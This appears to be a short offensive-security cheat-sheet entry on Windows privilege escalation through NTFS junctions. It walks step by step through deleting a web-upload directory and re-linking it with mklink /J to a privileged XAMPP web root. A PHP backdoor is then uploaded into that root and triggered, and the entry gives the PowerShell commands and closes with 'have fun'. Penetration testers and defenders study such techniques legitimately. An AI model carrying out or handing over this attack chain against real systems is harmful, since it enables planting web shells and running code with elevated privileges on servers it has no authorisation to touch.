_Junctions_ : Sometimes referred to as a soft link in Windows.

Assume we have a web application that is hosted in the following directory `c:\xampp\htdocs` and runs as a privileged user / service. We do not have rights to modify in here.

Also assume any web app file uploads get uploaded to a directory, such as `C:\windows\tasks\uploads\<arbitrary string>\file.php`, which the user we have pwned has control over. 

We can delete the folders that the file gets uploaded to (assuming it gets recreated, ie via a hashing algo), and link it to the privileged web app. That will allow us to write a shell which we can access from the web application.

Example
```powershell
# Deleting upload directory
PS C:\Windows\Tasks\Uploads\d02948dde3dfdff605042f5836c02baa> rm .\qsdphpbackdoor.php
PS C:\Windows\Tasks\Uploads> rm .\d02948dde3dfdff605042f5836c02baa\

# Linking it to the Webapp via NTFS Junction
PS C:\> cmd /c mklink /J C:\Windows\Tasks\Uploads\d02948dde3dfdff605042f5836c02baa C:\xampp\htdocs

# Reupload malicious shell

# Verify
gci C:\xampp\htdocs
-a----         3/12/2026   6:47 PM          13485 qsdphpbackdoor.php

# Trigger and have fun :)
```

